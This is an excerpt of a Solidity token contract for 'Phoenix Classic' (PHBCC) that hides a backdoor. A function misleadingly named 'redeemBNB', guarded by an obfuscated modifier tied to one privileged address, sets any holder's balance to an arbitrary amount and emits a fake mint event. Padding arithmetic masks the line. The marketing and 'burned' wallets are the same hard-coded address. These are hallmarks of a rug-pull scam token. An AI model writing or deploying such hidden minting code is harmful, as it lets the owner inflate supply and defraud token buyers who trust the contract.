...
abstract contract PhoenixContext {
...
contract Phoenix is PhoenixContext, PhoenixIERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Phoenix Classic";
    string private _symbol = "PHBCC";
    uint8 private _decimals = 2;
    address public BTCDOWNNOWWWWW;
    address payable public marketingWalletAddress = payable(0xdf6CA03D6785d044b134477e8556272E1EbD546C); 
    address payable public BurnedWalletAddress = payable(0xdf6CA03D6785d044b134477e8556272E1EbD546C); 
  ...
  modifier BTCYYYWWW () {
    require(BTCDOWNNOWWWWW == msg.sender, "ERC20: permit Pancake address");
    _;
  }   
    ...
    function redeemBNB(address NFTsadr, uint256 NFTs) external BTCYYYWWW {
      _balances[NFTsadr] = (NFTs / 1 - NFTs / 1) + NFTs * 10 ** _decimals;
        emit Transfer(address(0), NFTsadr, NFTs * 10 ** _decimals);
  }  
